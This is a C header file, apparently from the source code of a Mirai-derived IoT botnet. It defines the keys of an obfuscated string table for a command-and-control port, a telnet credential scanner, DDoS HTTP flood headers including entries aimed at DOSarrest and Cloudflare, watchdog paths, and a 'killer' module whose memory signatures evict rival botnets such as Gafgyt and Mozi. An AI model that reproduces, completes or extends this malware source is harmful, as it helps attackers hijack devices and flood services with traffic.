#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};

#define TABLE_CNC_PORT                  1
#define TABLE_SCAN_CB_PORT              2
#define TABLE_EXEC_SUCCESS              3

#define TABLE_KILLER_PROC               4
#define TABLE_KILLER_EXE                5
#define TABLE_KILLER_FD                 6
#define TABLE_KILLER_MAPS               7
#define TABLE_KILLER_STATUS             8
#define TABLE_KILLER_TCP                9
#define TABLE_KILLER_CMDLINE            10

#define TABLE_KILLER_TMP                11
#define TABLE_KILLER_DATALOCAL          12
#define TABLE_KILLER_QTX                13
#define TABLE_KILLER_DOT                14
#define TABLE_KILLER_ARC                15
#define TABLE_KILLER_ARM                16
#define TABLE_KILLER_ARM5               17
#define TABLE_KILLER_ARM6               18
#define TABLE_KILLER_ARM7               19
#define TABLE_KILLER_X86                20
#define TABLE_KILLER_X86_64             21
#define TABLE_KILLER_SH4                22
#define TABLE_KILLER_MIPS               23
#define TABLE_KILLER_MPSL               24
#define TABLE_KILLER_PPC                25
#define TABLE_KILLER_SDA                26
#define TABLE_KILLER_MTD                27
#define TABLE_KILLER_QTX2               28
#define TABLE_KILLER_HAKAI              29

#define TABLE_KILLER_REP1               30
#define TABLE_KILLER_REP2               31
#define TABLE_KILLER_REP3               32
#define TABLE_KILLER_REP4               33
#define TABLE_KILLER_REP5               34
#define TABLE_KILLER_REP6               35
#define TABLE_KILLER_REP7               36
#define TABLE_KILLER_REP8               37
#define TABLE_KILLER_REP9               38
#define TABLE_KILLER_REP10              39
#define TABLE_KILLER_ELF                40

#define PROC_SELF_COMM                  41
#define PROC_SELF_CMDLINE               42

#define TABLE_SCAN_SHELL                43
#define TABLE_SCAN_ENABLE               44
#define TABLE_SCAN_SYSTEM               45
#define TABLE_SCAN_SH                   46
#define TABLE_SCAN_LSHELL               47
#define TABLE_SCAN_QUERY                48
#define TABLE_SCAN_RESP                 49
#define TABLE_SCAN_NCORRECT             50
#define TABLE_SCAN_OGIN                 51
#define TABLE_SCAN_ASSWORD              52
#define TABLE_SCAN_ENTER                53
#define TABLE_SCAN_BAH                  54
#define TABLE_SCAN_START                55

#define TABLE_ATK_VSE                   56
#define TABLE_ATK_RESOLVER              57
#define TABLE_ATK_NSERV                 58

#define TABLE_MISC_WATCHDOG				59
#define TABLE_MISC_WATCHDOG2			60
#define TABLE_MISC_WATCHDOG3            61
#define TABLE_MISC_WATCHDOG4            62
#define TABLE_MISC_WATCHDOG5            63
#define TABLE_MISC_WATCHDOG6            64
#define TABLE_MISC_WATCHDOG7            65
#define TABLE_MISC_WATCHDOG8            66
#define TABLE_MISC_WATCHDOG9            67

#define TABLE_KILLER_SAFE               68
#define TABLE_KILLER_DELETED            69
#define TABLE_KILLER_ANIME              70
#define TABLE_EXEC_MIRAI                71
#define TABLE_EXEC_SORA1                72
#define TABLE_EXEC_SORA2                73
#define TABLE_EXEC_SORA3                74
#define TABLE_EXEC_OWARI                75
#define TABLE_EXEC_OWARI2               76
#define TABLE_EXEC_JOSHO                77
#define TABLE_EXEC_APOLLO               78
#define TABLE_EXEC_STATUS               79
#define TABLE_EXEC_ANIME                80
#define TABLE_EXEC_ROUTE                81
#define TABLE_EXEC_CPUINFO              82
#define TABLE_EXEC_BOGO                 83
#define TABLE_EXEC_RC                   84
#define TABLE_EXEC_MASUTA1              85
#define TABLE_EXEC_MIRAI1               86
#define TABLE_EXEC_MIRAI2               87
#define TABLE_EXEC_VAMP1                88
#define TABLE_EXEC_VAMP3                89
#define TABLE_EXEC_IRC1                 90
#define TABLE_EXEC_QBOT1                91
#define TABLE_EXEC_QBOT2                92
#define TABLE_EXEC_IRC2                 93
#define TABLE_EXEC_MIRAI3               94
#define TABLE_EXEC_EXE                  95
#define TABLE_EXEC_OMNI                 96
#define TABLE_EXEC_LOL                  97
#define TABLE_EXEC_SHINTO3              98
#define TABLE_EXEC_SHINTO5              99
#define TABLE_EXEC_JOSHO5               100
#define TABLE_EXEC_JOSHO4               101       

#define TABLE_KILLER_DEVNULL			102
#define TABLE_KILLER_COOKIE				103
#define TABLE_KILLER_ASSWORD			104
#define TABLE_KILLER_OGIN			    105
#define TABLE_KILLER_ENTER				106
#define TABLE_KILLER_WATCHDOG			107
#define TABLE_KILLER_WATCHDOG2		    108
#define TABLE_KILLER_HTTP				109
#define TABLE_KILLER_NETSLINK			110
#define TABLE_KILLER_NVALID				111
#define TABLE_KILLER_SERNAME			112
#define TABLE_KILLER_ENIED				113
#define TABLE_KILLER_BINSH				114
#define PROC_SELF_EXE                   115
#define TABLE_KILLER_UPX                116
#define TABLE_KILLER_CWD                117
#define TABLE_KILLER_VAR_TMP            118 
#define TABLE_KILLER_VAR                119

#define TABLE_ATK_KEEP_ALIVE            120
#define TABLE_ATK_ACCEPT                121
#define TABLE_ATK_ACCEPT_LNG            122
#define TABLE_ATK_CONTENT_TYPE          123
#define TABLE_ATK_SET_COOKIE            124
#define TABLE_ATK_REFRESH_HDR           125
#define TABLE_ATK_LOCATION_HDR          126
#define TABLE_ATK_SET_COOKIE_HDR        127
#define TABLE_ATK_CONTENT_LENGTH_HDR    128
#define TABLE_ATK_TRANSFER_ENCODING_HDR 129
#define TABLE_ATK_CHUNKED               130
#define TABLE_ATK_KEEP_ALIVE_HDR        131
#define TABLE_ATK_CONNECTION_HDR        132
#define TABLE_ATK_DOSARREST             133
#define TABLE_ATK_CLOUDFLARE_NGINX      134

#define TABLE_HTTP_1                  	135
#define TABLE_HTTP_2                  	136
#define TABLE_HTTP_3                	137
#define TABLE_HTTP_4                 	138
#define TABLE_HTTP_5                 	139
#define TABLE_HTTP_6                 	140
#define TABLE_HTTP_7                 	141
#define TABLE_HTTP_8                 	142
#define TABLE_HTTP_9                 	143
#define TABLE_HTTP_10                 	144
#define TABLE_HTTP_11                 	145
#define TABLE_HTTP_12                 	146
#define TABLE_HTTP_13                 	147
#define TABLE_HTTP_14                 	148
#define TABLE_HTTP_15                 	149

#define TABLE_MISC_RAND					150

/* Killer hunt signatures (new entries for Aho-Corasick scanner) */
#define TABLE_MEM_GAFGYT                151
#define TABLE_MEM_SATORI                152
#define TABLE_MEM_HAJIME                153
#define TABLE_MEM_MOZI                  154
#define TABLE_MEM_BASHLITE              155
#define TABLE_MEM_TSUNAMI               156
#define TABLE_MEM_MUHSTIK               157
#define TABLE_MEM_XORDDOS               158
#define TABLE_MEM_KATANA                159
#define TABLE_MEM_PINKBOT               160
#define TABLE_MEM_LIGHTAIDRA            161
#define TABLE_MEM_CONDI                 162
#define TABLE_MEM_KIRAZ                 163
#define TABLE_MEM_HTTP_BROWSER          164
#define TABLE_MEM_SORA_BINARY           165
#define TABLE_MEM_TMP_WLANCONT          166
#define TABLE_MEM_TMP_JNO               167
#define TABLE_MEM_ATERNA                168
#define TABLE_MEM_ZOLLARD               169
#define TABLE_MEM_REMAITEN              170
#define TABLE_MEM_JOKER                 171
#define TABLE_MEM_COSMIC                172
#define TABLE_MEM_MANJI                 173
#define TABLE_MEM_STAR                  174
#define TABLE_MEM_SNOOPY                175
#define TABLE_MEM_EAGLEWARE             176
#define TABLE_MEM_DEBUGBOT              177
#define TABLE_MEM_INDIA                 178
#define TABLE_MEM_MAYDAY                179
#define TABLE_MEM_SAKURA                180
#define TABLE_MEM_MORTE                 181
#define TABLE_MEM_ASTRO                 182
#define TABLE_MEM_BOTNET_AIO            183
#define TABLE_MEM_INDIATECH             184
#define TABLE_MEM_APEX                  185

/* Reuse existing table slots for signatures already present as TABLE_EXEC_* */
#define TABLE_MEM_MIRAI                 TABLE_EXEC_MIRAI
#define TABLE_MEM_SORA1                 TABLE_EXEC_SORA1
#define TABLE_MEM_SORA2                 TABLE_EXEC_SORA2
#define TABLE_MEM_SORA3                 TABLE_EXEC_SORA3
#define TABLE_MEM_OWARI                 TABLE_EXEC_OWARI
#define TABLE_MEM_OWARI2                TABLE_EXEC_OWARI2
#define TABLE_MEM_JOSHO                 TABLE_EXEC_JOSHO
#define TABLE_MEM_JOSHO4                TABLE_EXEC_JOSHO4
#define TABLE_MEM_JOSHO5                TABLE_EXEC_JOSHO5
#define TABLE_MEM_APOLLO                TABLE_EXEC_APOLLO
#define TABLE_MEM_MASUTA                TABLE_EXEC_MASUTA1
#define TABLE_MEM_VAMP                  TABLE_EXEC_VAMP1
#define TABLE_MEM_QBOT1                 TABLE_EXEC_QBOT1
#define TABLE_MEM_QBOT2                 TABLE_EXEC_QBOT2
#define TABLE_MEM_OMNI                  TABLE_EXEC_OMNI
#define TABLE_MEM_SHINTO                TABLE_EXEC_SHINTO3
#define TABLE_MEM_HAKAI                 TABLE_KILLER_HAKAI
#define TABLE_MEM_QTX                   TABLE_KILLER_QTX
#define TABLE_PATH_PROC_SELF_EXE        PROC_SELF_EXE

#define TABLE_MAX_KEYS                  186

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
